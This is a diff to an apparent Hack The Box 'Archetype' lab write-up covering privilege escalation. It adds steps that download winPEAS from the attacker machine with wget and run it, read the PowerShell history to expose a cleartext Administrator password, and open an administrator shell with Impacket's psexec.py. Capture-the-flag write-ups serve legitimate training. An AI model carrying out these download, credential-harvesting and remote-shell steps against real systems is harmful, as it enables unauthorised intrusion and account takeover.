@@ -121,12 +121,18 @@ On the target machine, we will execute the <code?wget</code> command in order to
 system.<br>
 The file will be downloaded in the directory from which the wget command was run.<br>
 We will use powershell for all our commands:<br>
-<b>cmd</b>：<code>powershell</code><br><br>
+<b>cmd</b>：<code>powershell</code><br>
 <b>cmd</b>：<code>wget http://&lt;local_ip&gt;/winPEASx64.exe -outfile winPEASx64.exe</code><br><br>
 <img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/powershell.png" alt="powershell" width="60%">
-
-<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/psexec.py.png" alt="psexec" width="50%">
-
+We successfully downloaded the binary. To execute it, we will do the following:<br>
+<b>cmd</b>：<code>PS C:\Users\sql_svc\Downloads> .\winPEASx64.exe</code><br><br>
+We can navigate to the folder where the PowerShell history is stored:<br>
+<b>cmd</b>：<code>type ConsoleHost_history.txt</code><br>
+We got in cleartext the password for the Administrator user which is <code>MEGACORP_4dm1n!!</code><br>
 <img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/adminpasswd.png" alt="adminpasswd" width="60%">
 
+We can now use the tool <code>psexec.py</code> again from the Impacket suite to get a shell as the <code>administrator</code>:<br>
+<b>cmd</b>：<code>python3 psexec.py administrator@&lt;target_ip&gt;</code><br>
+<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/psexec.py.png" alt="psexec" width="50%">
+You can find the root.txt on the Desktop of the Administrator user！<br>
 <img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/adminflag.png" alt="adminflag" width="60%">
